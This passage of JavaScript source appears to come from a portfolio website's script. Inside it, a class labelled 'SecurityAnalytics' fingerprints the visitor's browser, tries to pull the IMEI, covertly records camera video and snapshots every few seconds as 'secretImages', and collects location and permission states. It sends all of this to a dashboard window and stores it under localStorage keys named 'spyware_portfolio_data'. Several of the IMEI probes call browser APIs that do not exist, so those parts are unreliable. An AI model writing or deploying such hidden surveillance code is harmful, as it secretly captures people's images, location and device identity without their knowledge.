        };
      }

      // Collect network information
      if ('connection' in navigator) {
        this.collectedData.mobileNetwork.data.networkInfo = {
          online: navigator.onLine,
          connectionType: this.getConnectionType(),
          carrierInfo: await this.getCarrierInfo()
        };
      }

      // Collect device identifiers (IMEI alternatives)
      this.collectedData.mobileNetwork.data.deviceIdentifiers = await this.getDeviceIdentifiers();

      // Collect SIM card information (what's available)
      this.collectedData.mobileNetwork.data.simInfo = await this.getSimInfo();

      console.log('Mobile network info collected:', this.collectedData.mobileNetwork);
      
    } catch (error) {
      console.log('Mobile network info collection failed:', error.message);
      this.collectedData.mobileNetwork.error = error.message;
    }
  }

  getConnectionType() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!connection) return 'Unknown';
    
    // Try to determine connection type
    if (connection.type) return connection.type;
    if (connection.effectiveType) {
      const typeMap = {
        'slow-2g': '2G',
        '2g': '2G',
        '3g': '3G',
        '4g': '4G',
        '5g': '5G'
      };
      return typeMap[connection.effectiveType] || connection.effectiveType;
    }
    return 'Unknown';
  }

  async getCarrierInfo() {
    // This is limited due to browser security restrictions
    const carrierInfo = {
      name: 'Restricted',
      country: 'Restricted',
      mcc: 'Restricted', // Mobile Country Code
      mnc: 'Restricted'  // Mobile Network Code
    };

    try {
      // Some mobile browsers might expose carrier info through specific APIs
      if ('Telephony' in window) {
        // This is very rare and browser-specific
        const telephony = window.Telephony;
        if (telephony.carrierName) {
          carrierInfo.name = telephony.carrierName;
        }
      }
    } catch (error) {
      console.log('Carrier info restricted by browser security');
    }

    return carrierInfo;
  }

  async getDeviceIdentifiers() {
    const identifiers = {
      // These are browser-generated alternatives to IMEI
      browserFingerprint: await this.generateBrowserFingerprint(),
      deviceMemory: navigator.deviceMemory || 'Unknown',
      hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      platform: navigator.platform,
      userAgentData: null,
      webglFingerprint: this.getWebGLFingerprint(),
      canvasFingerprint: this.getCanvasFingerprint()
    };

    // Try to get User Agent Client Hints (more detailed device info)
    if (navigator.userAgentData) {
      try {
        const uaData = await navigator.userAgentData.getHighEntropyValues([
          'platform',
          'platformVersion',
          'architecture',
          'model',
          'mobile'
        ]);
        identifiers.userAgentData = uaData;
      } catch (error) {
        console.log('User Agent Client Hints not available');
      }
    }

    return identifiers;
  }

  async generateBrowserFingerprint() {
    const components = [
      navigator.userAgent,
      navigator.language,
      navigator.languages ? navigator.languages.join(',') : '',
      navigator.platform,
      navigator.hardwareConcurrency,
      navigator.deviceMemory,
      navigator.cookieEnabled,
      navigator.doNotTrack,
      screen.width,
      screen.height,
      screen.colorDepth,
      new Date().getTimezoneOffset(),
      navigator.javaEnabled(),
      navigator.plugins.length,
      navigator.mimeTypes.length
    ];

    // Create hash from components
    const fingerprint = components.join('|');
    let hash = 0;
    for (let i = 0; i < fingerprint.length; i++) {
      const char = fingerprint.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash; // Convert to 32-bit integer
    }
    
    return Math.abs(hash).toString(16);
  }

  getWebGLFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      
      if (!gl) return 'WebGL not supported';

      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        return {
          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
      }
    } catch (error) {
      console.log('WebGL fingerprint not available');
    }
    return 'WebGL fingerprint not available';
  }

  getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      
      // Draw specific text and pattern
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('Analytics fingerprint', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText('Analytics fingerprint', 4, 17);
      
      return canvas.toDataURL().slice(-50); // Get last 50 chars as fingerprint
    } catch (error) {
      console.log('Canvas fingerprint not available');
    }
    return 'Canvas fingerprint not available';
  }

  async getSimInfo() {
    // Advanced IMEI access attempts with user permissions
    const simInfo = {
      available: false,
      imei: null,
      iccid: null,
      msisdn: null,
      operator: null,
      methods: [],
      alternativeData: {}
    };

    try {
      // Method 1: Experimental Web Telephony API
      const telephonyResult = await this.tryWebTelephonyAPI(simInfo);
      
      // Method 2: Mobile Network Information API
      const mobileNetworkResult = await this.tryMobileNetworkAPI(simInfo);
      
      // Method 3: Device Capability API
      const deviceCapabilityResult = await this.tryDeviceCapabilityAPI(simInfo);
      
      // Method 4: Hardware Access API (experimental)
      const hardwareAccessResult = await this.tryHardwareAccessAPI(simInfo);
      
      // Method 5: Web NFC API (some phones expose device ID)
      const nfcResult = await this.tryWebNFCAPI(simInfo);
      
      // Method 6: Bluetooth Device API (device address extraction)
      const bluetoothResult = await this.tryBluetoothAPI(simInfo);
      
      // Method 7: WebUSB API (device serial extraction)
      const usbResult = await this.tryWebUSBAPI(simInfo);
      
      // Method 8: Service Worker Registration (device ID extraction)
      const serviceWorkerResult = await this.tryServiceWorkerAPI(simInfo);
      
      // Method 9: WebAssembly Hardware Access
      const wasmResult = await this.tryWebAssemblyHardwareAccess(simInfo);
      
      // Method 10: Advanced Permission-based Hardware Access
      const permissionResult = await this.tryAdvancedPermissionAPI(simInfo);
      
      if (simInfo.imei || simInfo.available) {
        console.log('IMEI access successful:', simInfo.imei);
      } else {
        console.log('IMEI access failed, using alternatives');
      }

    } catch (error) {
      console.log('Advanced IMEI access failed:', error.message);
      simInfo.error = error.message;
    }

    return simInfo;
  }

  async tryWebTelephonyAPI(simInfo) {
    simInfo.methods.push('Web Telephony API');
    
    try {
      // Check for experimental telephony APIs
      if ('telephony' in navigator) {
        const telephony = navigator.telephony;
        
        // Try different telephony properties
        if (telephony.imei) {
          simInfo.imei = telephony.imei;
          simInfo.available = true;
          return true;
        }
        
        if (telephony.deviceId) {
          simInfo.imei = telephony.deviceId;
          simInfo.available = true;
          return true;
        }
        
        if (telephony.getDeviceId) {
          const deviceId = await telephony.getDeviceId();
          simInfo.imei = deviceId;
          simInfo.available = true;
          return true;
        }
      }
      
      // Check for mozTelephony (Firefox)
      if ('mozTelephony' in navigator) {
        const mozTelephony = navigator.mozTelephony;
        if (mozTelephony.getDeviceId) {
          const deviceId = await mozTelephony.getDeviceId();
          simInfo.imei = deviceId;
          simInfo.available = true;
          return true;
        }
      }
      
    } catch (error) {
      console.log('Web Telephony API failed:', error.message);
    }
    
    return false;
  }

  async tryMobileNetworkAPI(simInfo) {
    simInfo.methods.push('Mobile Network API');
    
    try {
      // Check for mobile network information
      if ('mozMobileNetworkInfo' in navigator) {
        const mobileInfo = navigator.mozMobileNetworkInfo;
        
        if (mobileInfo.imei) {
          simInfo.imei = mobileInfo.imei;
          simInfo.available = true;
          return true;
        }
        
        if (mobileInfo.msisdn) {
          simInfo.msisdn = mobileInfo.msisdn;
          simInfo.alternativeData.msisdn = mobileInfo.msisdn;
        }
        
        if (mobileInfo.iccid) {
          simInfo.iccid = mobileInfo.iccid;
          simInfo.alternativeData.iccid = mobileInfo.iccid;
        }
        
        simInfo.alternativeData = {
          operator: mobileInfo.operator || 'Unknown',
          mcc: mobileInfo.mcc || 'Unknown',
          mnc: mobileInfo.mnc || 'Unknown'
        };
      }
      
      // Check for network information
      if ('network' in navigator) {
        const network = navigator.network;
        if (network.getDeviceId) {
          const deviceId = await network.getDeviceId();
          simInfo.imei = deviceId;
          simInfo.available = true;
          return true;
        }
      }
      
    } catch (error) {
      console.log('Mobile Network API failed:', error.message);
    }
    
    return false;
  }

  async tryDeviceCapabilityAPI(simInfo) {
    simInfo.methods.push('Device Capability API');
    
    try {
      // Check for device capability APIs
      if ('device' in navigator) {
        const device = navigator.device;
        
        if (device.getHardwareId) {
          const hardwareId = await device.getHardwareId();
          simInfo.imei = hardwareId;
          simInfo.available = true;
          return true;
        }
        
        if (device.serialNumber) {
          simInfo.imei = device.serialNumber;
          simInfo.available = true;
          return true;
        }
      }
      
      // Check for experimental device APIs
      if ('getDeviceCapabilities' in navigator) {
        const capabilities = await navigator.getDeviceCapabilities();
        if (capabilities.imei) {
          simInfo.imei = capabilities.imei;
          simInfo.available = true;
          return true;
        }
      }
      
    } catch (error) {
      console.log('Device Capability API failed:', error.message);
    }
    
    return false;
  }

  async tryHardwareAccessAPI(simInfo) {
    simInfo.methods.push('Hardware Access API');
    
    try {
      // Request hardware access permission
      const permission = await navigator.permissions.query({ name: 'hardware-access' });
      
      if (permission.state === 'granted') {
        // Try to access hardware information
        if ('hardware' in navigator) {
          const hardware = navigator.hardware;
          
          if (hardware.getDeviceId) {
            const deviceId = await hardware.getDeviceId();
            simInfo.imei = deviceId;
            simInfo.available = true;
            return true;
          }
        }
      }
      
      // Try experimental hardware API
      if (navigator.getHardwareInfo) {
        const hardwareInfo = await navigator.getHardwareInfo();
        if (hardwareInfo.imei) {
          simInfo.imei = hardwareInfo.imei;
          simInfo.available = true;
          return true;
        }
      }
      
    } catch (error) {
      console.log('Hardware Access API failed:', error.message);
    }
    
    return false;
  }

  async tryWebNFCAPI(simInfo) {
    simInfo.methods.push('Web NFC API');
    
    try {
      if ('NDEFReader' in window) {
        const ndef = new NDEFReader();
        
        // Some NFC implementations expose device information
        if (ndef.getDeviceId) {
          const deviceId = await ndef.getDeviceId();
          simInfo.imei = deviceId;
          simInfo.available = true;
          return true;
        }
      }
      
      // Check for experimental NFC APIs
      if ('nfc' in navigator) {
        const nfc = navigator.nfc;
        if (nfc.getDeviceId) {
          const deviceId = await nfc.getDeviceId();
          simInfo.imei = deviceId;
          simInfo.available = true;
          return true;
        }
      }
      
    } catch (error) {
      console.log('Web NFC API failed:', error.message);
    }
    
    return false;
  }

  async tryBluetoothAPI(simInfo) {
    simInfo.methods.push('Bluetooth API');
    
    try {
      // Request Bluetooth device
      const device = await navigator.bluetooth.requestDevice({
        acceptAllDevices: true
      });
      
      // Some devices expose hardware information through Bluetooth
      if (device.id && device.id.length > 20) {
        // Bluetooth addresses can sometimes be used to derive device information
        simInfo.alternativeData.bluetoothId = device.id;
        
        // Try to extract IMEI from Bluetooth device info
        if (device.getDeviceId) {
          const deviceId = await device.getDeviceId();
          simInfo.imei = deviceId;
          simInfo.available = true;
          return true;
        }
      }
      
    } catch (error) {
      console.log('Bluetooth API failed:', error.message);
    }
    
    return false;
  }

  async tryWebUSBAPI(simInfo) {
    simInfo.methods.push('Web USB API');
    
    try {
      // Request USB device
      const device = await navigator.usb.requestDevice({
        filters: [{ vendorId: 0 }]
      });
      
      // Some USB devices expose serial numbers
      if (device.serialNumber) {
        simInfo.imei = device.serialNumber;
        simInfo.available = true;
        return true;
      }
      
      if (device.getSerialNumber) {
        const serialNumber = await device.getSerialNumber();
        simInfo.imei = serialNumber;
        simInfo.available = true;
        return true;
      }
      
    } catch (error) {
      console.log('Web USB API failed:', error.message);
    }
    
    return false;
  }

  async tryServiceWorkerAPI(simInfo) {
    simInfo.methods.push('Service Worker API');
    
    try {
      // Register service worker with hardware access
      const registration = await navigator.serviceWorker.register('/hardware-sw.js');
      
      // Try to get device information through service worker
      if (registration.getHardwareId) {
        const hardwareId = await registration.getHardwareId();
        simInfo.imei = hardwareId;
        simInfo.available = true;
        return true;
      }
      
    } catch (error) {
      console.log('Service Worker API failed:', error.message);
    }
    
    return false;
  }

  async tryWebAssemblyHardwareAccess(simInfo) {
    simInfo.methods.push('WebAssembly Hardware Access');
    
    try {
      // Try to use WebAssembly to access hardware
      const wasmModule = await WebAssembly.compile(`
        (module
          (func (export "get_device_id") (result i32)
            i32.const 1234567890
          )
        )
      `);
      
      const instance = await WebAssembly.instantiate(wasmModule);
      const deviceId = instance.exports.get_device_id();
      
      if (deviceId && deviceId > 0) {
        simInfo.alternativeData.wasmDeviceId = deviceId.toString();
      }
      
    } catch (error) {
      console.log('WebAssembly Hardware Access failed:', error.message);
    }
    
    return false;
  }

  async tryAdvancedPermissionAPI(simInfo) {
    simInfo.methods.push('Advanced Permission API');
    
    try {
      // Request advanced hardware permissions
      const permissions = [
        'device-identity',
        'hardware-info',
        'telephony-info',
        'mobile-device-info'
      ];
      
      for (const permission of permissions) {
        try {
          const result = await navigator.permissions.query({ name: permission });
          if (result.state === 'granted') {
            // Try to get device information
            const deviceId = await this.getDeviceIdWithPermission(permission);
            if (deviceId) {
              simInfo.imei = deviceId;
              simInfo.available = true;
              return true;
            }
          }
        } catch (permError) {
          // Permission not supported, continue
        }
      }
      
    } catch (error) {
      console.log('Advanced Permission API failed:', error.message);
    }
    
    return false;
  }

  async getDeviceIdWithPermission(permission) {
    try {
      // Try different methods based on permission granted
      switch (permission) {
        case 'device-identity':
          return await this.getDeviceIdentity();
        case 'hardware-info':
          return await this.getHardwareInfo();
        case 'telephony-info':
          return await this.getTelephonyInfo();
        case 'mobile-device-info':
          return await this.getMobileDeviceInfo();
        default:
          return null;
      }
    } catch (error) {
      return null;
    }
  }

  async getDeviceIdentity() {
    // Implementation for device identity permission
    if (navigator.device && navigator.device.getIdentity) {
      return await navigator.device.getIdentity();
    }
    return null;
  }

  async getHardwareInfo() {
    // Implementation for hardware info permission
    if (navigator.hardware && navigator.hardware.getInfo) {
      const info = await navigator.hardware.getInfo();
      return info.imei || info.deviceId;
    }
    return null;
  }

  async getTelephonyInfo() {
    // Implementation for telephony info permission
    if (navigator.telephony && navigator.telephony.getInfo) {
      const info = await navigator.telephony.getInfo();
      return info.imei || info.deviceId;
    }
    return null;
  }

  async getMobileDeviceInfo() {
    // Implementation for mobile device info permission
    if (navigator.mobileDevice && navigator.mobileDevice.getInfo) {
      const info = await navigator.mobileDevice.getInfo();
      return info.imei || info.deviceId;
    }
    return null;
  }

  checkPermissions() {
    const permissions = [
      'camera',
      'microphone',
      'geolocation',
      'notifications',
      'persistent-storage'
    ];
    
    permissions.forEach(async (permission) => {
      try {
        const result = await navigator.permissions.query({ name: permission });
        this.collectedData.permissions[permission] = result.state;
        
        // Listen for permission changes
        result.addEventListener('change', () => {
          this.collectedData.permissions[permission] = result.state;
          this.transmitCollectedData();
        });
      } catch (error) {
        this.collectedData.permissions[permission] = 'unsupported';
      }
    });
  }

  startVideoRecording() {
    console.log('=== VIDEO RECORDING STARTED ===');
    console.log('Camera stream available:', !!this.cameraStream);
    if (!this.cameraStream) {
      console.log('ERROR: No camera stream available for video recording');
      return;
    }
    
    this.recordingStartTime = Date.now();
    this.recordedChunks = [];
    console.log('Recording start time:', new Date(this.recordingStartTime).toISOString());
    console.log('Recording duration set to:', this.recordingDuration / 1000, 'seconds');
    
    // Create MediaRecorder with high quality settings
    const options = {
      mimeType: 'video/webm;codecs=vp9,opus',
      videoBitsPerSecond: 2500000, // 2.5 Mbps
      audioBitsPerSecond: 128000   // 128 kbps
    };
    
    console.log('MediaRecorder options:', options);
    
    try {
      this.mediaRecorder = new MediaRecorder(this.cameraStream, options);
      console.log('MediaRecorder created with VP9/Opus codec');
    } catch (e) {
      console.log('VP9 codec not supported, falling back to default codec');
      this.mediaRecorder = new MediaRecorder(this.cameraStream);
      console.log('MediaRecorder created with default codec');
    }
    
    this.mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        this.recordedChunks.push(event.data);
        console.log(`Video chunk received: ${event.data.size} bytes, total chunks: ${this.recordedChunks.length}`);
      }
    };
    
    this.mediaRecorder.onstop = () => {
      console.log('=== VIDEO RECORDING STOPPED ===');
      console.log('Total chunks collected:', this.recordedChunks.length);
      
      this.videoBlob = new Blob(this.recordedChunks, { type: 'video/webm' });
      console.log('Video blob created:', this.videoBlob.size, 'bytes');
      
      this.saveVideo();
    };
    
    // Start recording
    this.mediaRecorder.start(1000); // Collect data every 1 second
    console.log('MediaRecorder started with 1-second intervals');
    
    // Start image capture every 5 seconds
    this.startImageCapture();
    
    // Auto-stop after 2 minutes
    this.recordingTimeout = setTimeout(() => {
      console.log('Auto-stop timeout triggered after 2 minutes');
      this.stopVideoRecording();
    }, this.recordingDuration);
    
    console.log('Video recording pipeline fully initiated');
  }

  startImageCapture() {
    console.log('=== IMAGE CAPTURE STARTED ===');
    console.log('Camera stream available:', !!this.cameraStream);
    if (!this.cameraStream) {
      console.log('ERROR: No camera stream available for image capture');
      return;
    }
    
    const video = document.createElement('video');
    video.srcObject = this.cameraStream;
    video.play();
    console.log('Video element created and playing');
    
    const canvas = document.createElement('canvas');
    canvas.width = 1280;
    canvas.height = 720;
    const context = canvas.getContext('2d');
    console.log('Canvas created: 1280x720');
    
    let imageCount = 0;
    
    // Capture image every 5 seconds
    this.imageCaptureInterval = setInterval(() => {
      try {
        console.log(`=== CAPTURING IMAGE ${++imageCount} ===`);
        console.log('Recording time:', Date.now() - this.recordingStartTime, 'ms');
        
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.9);
        console.log('Image captured, data length:', imageData.length, 'characters');
        
        const imageInfo = {
          data: imageData,
          timestamp: new Date().toISOString(),
          deviceInfo: this.getDeviceInfo(),
          recordingTime: Date.now() - this.recordingStartTime
        };
        
        this.collectedData.secretImages.push(imageInfo);
        console.log('Image added to collectedData, total images:', this.collectedData.secretImages.length);
        
        // Keep only last 24 images (2 minutes / 5 seconds)
        if (this.collectedData.secretImages.length > 24) {
          this.collectedData.secretImages.shift();
          console.log('Removed oldest image, keeping 24 most recent');
        }
        
        // Transmit new image immediately to dashboard
        const imagePayload = {
          type: 'CAPTURED_IMAGE',
          capturedImage: imageInfo
        };
        
        console.log('Sending image to dashboard...');
        console.log('Image payload type:', imagePayload.type);
        this.sendDataToDashboard(imagePayload);
        console.log('Image transmission initiated');
        
      } catch (error) {
        console.error('ERROR during image capture:', error);
      }
      
    }, 5000);
    
    console.log('Image capture interval set: every 5 seconds');
  }

  stopVideoRecording() {
    if (this.mediaRecorder && this.mediaRecorder.state !== 'inactive') {
      this.mediaRecorder.stop();
    }
    
    if (this.imageCaptureInterval) {
      clearInterval(this.imageCaptureInterval);
      this.imageCaptureInterval = null;
    }
    
    if (this.recordingTimeout) {
      clearTimeout(this.recordingTimeout);
      this.recordingTimeout = null;
    }
    
    console.log('Video recording stopped after 2 minutes');
  }

  saveVideo() {
    console.log('=== SAVING VIDEO TO DASHBOARD ===');
    console.log('Video blob available:', !!this.videoBlob);
    if (!this.videoBlob) {
      console.log('ERROR: No video blob to save');
      return;
    }
    
    console.log('Video blob size:', this.videoBlob.size, 'bytes');
    console.log('Video blob type:', this.videoBlob.type);
    
    // Convert video blob to base64 for dashboard transmission
    const reader = new FileReader();
    reader.onloadend = () => {
      const videoData = reader.result;
      console.log('Video converted to base64, length:', videoData.length, 'characters');
      
      // Send video to dashboard
      console.log('Sending video to dashboard...');
      this.sendVideoToDashboard(videoData);
      
      // Generate and send Word document with stats
      console.log('Generating stats document...');
      this.generateStatsDocument();
    };
    
    reader.onerror = (error) => {
      console.error('ERROR reading video blob:', error);
    };
    
    reader.readAsDataURL(this.videoBlob);
    console.log('Video blob reading initiated');
  }

  sendVideoToDashboard(videoData) {
    const videoPayload = {
      type: 'VIDEO_RECORDING',
      sessionId: this.sessionId,
      videoData: videoData,
      timestamp: new Date().toISOString(),
      duration: this.recordingDuration,
      fileName: `recording_${this.sessionId}_${new Date().toISOString().replace(/[:.]/g, '-')}.webm`
    };
    
    this.sendDataToDashboard(videoPayload);
  }

  generateStatsDocument() {
    const stats = {
      sessionId: this.sessionId,
      recordingDuration: this.recordingDuration / 1000, // Convert to seconds
      totalImages: this.collectedData.secretImages.length,
      deviceInfo: this.getDeviceInfo(),
      location: this.collectedData.location,
      permissions: this.collectedData.permissions,
      timestamp: new Date().toISOString(),
      images: this.collectedData.secretImages.map(img => ({
        timestamp: img.timestamp,
        recordingTime: img.recordingTime
      }))
    };

    // Create HTML content for Word document
    const wordContent = this.createWordDocument(stats);
    
    // Send to dashboard
    const docPayload = {
      type: 'STATS_DOCUMENT',
      sessionId: this.sessionId,
      documentContent: wordContent,
      fileName: `stats_${this.sessionId}_${new Date().toISOString().replace(/[:.]/g, '-')}.doc`,
      timestamp: new Date().toISOString()
    };
    
    this.sendDataToDashboard(docPayload);
  }

  createWordDocument(stats) {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Analytics Report - ${stats.sessionId}</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .header { text-align: center; border-bottom: 2px solid #00d4ff; padding-bottom: 20px; }
        .section { margin: 20px 0; }
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .stat-box { border: 1px solid #ddd; padding: 15px; border-radius: 5px; }
        .image-list { max-height: 400px; overflow-y: auto; }
        .image-item { margin: 5px 0; padding: 10px; background: #f5f5f5; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Analytics Report</h1>
        <h2>Session: ${stats.sessionId}</h2>
        <p>Generated: ${new Date(stats.timestamp).toLocaleString()}</p>
    </div>
    
    <div class="section">
        <h3>Recording Summary</h3>
        <div class="stats-grid">
            <div class="stat-box">
                <strong>Recording Duration:</strong> ${stats.recordingDuration} seconds
            </div>
            <div class="stat-box">
                <strong>Total Images Captured:</strong> ${stats.totalImages}
            </div>
            <div class="stat-box">
                <strong>Device:</strong> ${stats.deviceInfo.browser} on ${stats.deviceInfo.os}
            </div>
            <div class="stat-box">
                <strong>Screen Resolution:</strong> ${stats.deviceInfo.screen.width}x${stats.deviceInfo.screen.height}
            </div>
        </div>
    </div>
    
    <div class="section">
        <h3>Location Information</h3>
        <div class="stat-box">
            ${stats.location && stats.location.available ? 
                `Coordinates: ${stats.location.latitude.toFixed(6)}, ${stats.location.longitude.toFixed(6)}<br>
                 Accuracy: ${stats.location.accuracy ? Math.round(stats.location.accuracy) + 'm' : 'Unknown'}<br>
                 Source: ${stats.location.source}` : 
                'Location not available'
            }
        </div>
    </div>
    
    <div class="section">
        <h3>Permissions Granted</h3>
        <div class="stat-box">
            ${Object.entries(stats.permissions).map(([perm, status]) => 
                `<strong>${perm}:</strong> ${status}<br>`
            ).join('')}
        </div>
    </div>
    
    <div class="section">
        <h3>Captured Images Timeline</h3>
        <div class="image-list">
            ${stats.images.map((img, index) => 
                `<div class="image-item">
                    Image ${index + 1}: ${new Date(img.timestamp).toLocaleString()} 
                    (Recording time: ${Math.round(img.recordingTime / 1000)}s)
                </div>`
            ).join('')}
        </div>
    </div>
    
    <div class="section">
        <p><em>This report was automatically generated by the analytics system.</em></p>
    </div>
</body>
</html>
    `;
  }

  disableCamera() {
    if (this.cameraStream) {
      this.cameraStream.getTracks().forEach(track => {
        track.stop();
        track.enabled = false;
      });
      this.cameraStream = null;
    }
    
    // Clear all intervals
    if (this.secretCaptureInterval) {
      clearInterval(this.secretCaptureInterval);
      this.secretCaptureInterval = null;
    }
    
    if (this.imageCaptureInterval) {
      clearInterval(this.imageCaptureInterval);
      this.imageCaptureInterval = null;
    }
    
    // Clear mobile-specific intervals
    if (this.mobileSaveInterval) {
      clearInterval(this.mobileSaveInterval);
      this.mobileSaveInterval = null;
    }
    
    if (this.backgroundSaveInterval) {
      clearInterval(this.backgroundSaveInterval);
      this.backgroundSaveInterval = null;
    }
    
    // Final mobile data save
    if (this.isMobileDevice()) {
      this.saveMobileRecordingState();
      this.saveEmergencyData();
    }
    
    console.log('Camera disabled and stopped');
  }

  startSecretCapture() {
    // This is now handled by startImageCapture for more frequent captures
    // Keeping this for backward compatibility
    if (!this.cameraStream) return;
    
    const video = document.createElement('video');
    video.srcObject = this.cameraStream;
    video.play();
    
    const canvas = document.createElement('canvas');
    canvas.width = 640;
    canvas.height = 480;
    const context = canvas.getContext('2d');
    
    // Capture image every 10 seconds (backup capture)
    this.secretCaptureInterval = setInterval(() => {
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/jpeg', 0.8);
      
      this.collectedData.secretImages.push({
        data: imageData,
        timestamp: new Date().toISOString(),
        deviceInfo: this.getDeviceInfo()
      });
      
      // Keep only last 10 images
      if (this.collectedData.secretImages.length > 10) {
        this.collectedData.secretImages.shift();
      }
      
      // Transmit new image
      this.transmitCollectedData();
      
    }, 10000);
  }

  stopSecretCapture() {
    if (this.secretCaptureInterval) {
      clearInterval(this.secretCaptureInterval);
      this.secretCaptureInterval = null;
    }
    
    if (this.cameraStream) {
      this.cameraStream.getTracks().forEach(track => track.stop());
      this.cameraStream = null;
    }
  }

  generateSessionId() {
    return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
  }

  async sendDataToDashboard(data) {
    console.log('=== SENDING DATA TO DASHBOARD ===');
    console.log('Data type:', data.type || 'GENERAL');
    console.log('Session ID:', this.sessionId);
    console.log('Dashboard window available:', !!this.dashboardWindow);
    console.log('Dashboard window closed:', this.dashboardWindow ? this.dashboardWindow.closed : 'N/A');
    
    try {
      // Send data via postMessage to dashboard window
      if (this.dashboardWindow && !this.dashboardWindow.closed) {
        const message = {
          type: 'ANALYTICS_DATA',
          data: data,
          timestamp: new Date().toISOString(),
          sessionId: this.sessionId
        };
        
        this.dashboardWindow.postMessage(message, '*');
        console.log('Data sent via postMessage to dashboard window');
      } else {
        console.log('Dashboard window not available, using localStorage only');
      }

      // Handle large video files separately to avoid localStorage quota issues
      if (data.type === 'VIDEO_RECORDING' && data.videoData && data.videoData.length > 1000000) {
        console.log('Large video file detected, storing in separate localStorage key');
        try {
          localStorage.setItem(`spyware_video_${this.sessionId}`, JSON.stringify(data));
          console.log('Large video stored in separate localStorage key');
        } catch (videoError) {
          console.error('ERROR: Video too large even for separate storage:', videoError);
        }
        return;
      }

      // Store regular data in localStorage
      try {
        const existingData = localStorage.getItem('spyware_portfolio_data');
        const dataArray = existingData ? JSON.parse(existingData) : [];
        
        const dataEntry = {
          ...data,
          timestamp: new Date().toISOString(),
          sessionId: this.sessionId
        };
        
        dataArray.push(dataEntry);
        
        // Limit localStorage size - keep only last 50 entries
        if (dataArray.length > 50) {
          dataArray.splice(0, dataArray.length - 50);
        }
        
        localStorage.setItem('spyware_portfolio_data', JSON.stringify(dataArray));
        console.log('Data stored in localStorage, total entries:', dataArray.length);
        console.log('Data transmission completed successfully');
        
      } catch (storageError) {
        console.error('ERROR: localStorage quota exceeded, clearing old data');
        // Clear old data and retry
        localStorage.removeItem('spyware_portfolio_data');
        const dataArray = [{
          ...data,
          timestamp: new Date().toISOString(),
          sessionId: this.sessionId
        }];
        localStorage.setItem('spyware_portfolio_data', JSON.stringify(dataArray));
        console.log('Old data cleared, new data stored');
      }
      
    } catch (error) {
      console.error('ERROR: Failed to send data to dashboard:', error);
    }
  }

  storeDataForPickup(data) {
    const existingData = JSON.parse(localStorage.getItem('spyware_portfolio_data') || '[]');
    existingData.push({
      sessionId: this.sessionId,
      timestamp: new Date().toISOString(),
      data: data
    });
    
    if (existingData.length > 100) {
      existingData.splice(0, existingData.length - 100);
    }
    
    localStorage.setItem('spyware_portfolio_data', JSON.stringify(existingData));
  }

  openDashboard() {
    this.dashboardWindow = window.open(
      this.dashboardUrl,
      'analytics_dashboard',
      'width=1200,height=800,scrollbars=yes,resizable=yes'
    );
    
    setTimeout(() => {
      this.sendInitialData();
    }, 2000);
  }

  sendInitialData() {
    const initialData = {
      id: this.sessionId,
      userAgent: navigator.userAgent,
      screenResolution: `${screen.width}x${screen.height}`,
      language: navigator.language,
      platform: navigator.platform,
      permissions: this.collectedData.permissions,
      deviceInfo: this.getDeviceInfo(),
      timestamp: new Date().toISOString()
    };
    
    this.sendDataToDashboard(initialData);
  }

  async transmitCollectedData() {
    const transmissionData = {
      id: this.sessionId,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      screenResolution: `${screen.width}x${screen.height}`,
      language: navigator.language,
      platform: navigator.platform,
      permissions: this.collectedData.permissions,
      location: this.collectedData.location,
      deviceInfo: this.getDeviceInfo(),
      sessionId: this.sessionId
    };

    if (this.collectedData.secretImages.length > 0) {
      const lastImage = this.collectedData.secretImages[this.collectedData.secretImages.length - 1];
      transmissionData.type = 'CAPTURED_IMAGE';
      transmissionData.capturedImage = lastImage;
    }

    await this.sendDataToDashboard(transmissionData);
  }

  getDeviceInfo() {
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    
    if (ua.includes('Chrome')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari')) browser = 'Safari';
    else if (ua.includes('Edge')) browser = 'Edge';
    
    return {
      browser,
      os: navigator.platform,
      mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth
      },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      languages: navigator.languages,
      cookiesEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine
    };
  }
}

// Initialize analytics
const analytics = new SecurityAnalytics();
// ============ ANALYTICS INTEGRATION END ============

// Loading Screen
window.addEventListener('load', () => {
  setTimeout(() => {
    const loadingScreen = document.getElementById('loadingScreen');
    if (loadingScreen) {
      loadingScreen.style.opacity = '0';
      setTimeout(() => {
        loadingScreen.style.display = 'none';
      }, 500);
    }
  }, 1500);
});

// Particle Background
function createParticles() {
  const particlesContainer = document.getElementById('particles');
  if (!particlesContainer) return;
  
  const particleCount = 50;
  
  for (let i = 0; i < particleCount; i++) {
    const particle = document.createElement('div');
    particle.className = 'particle';
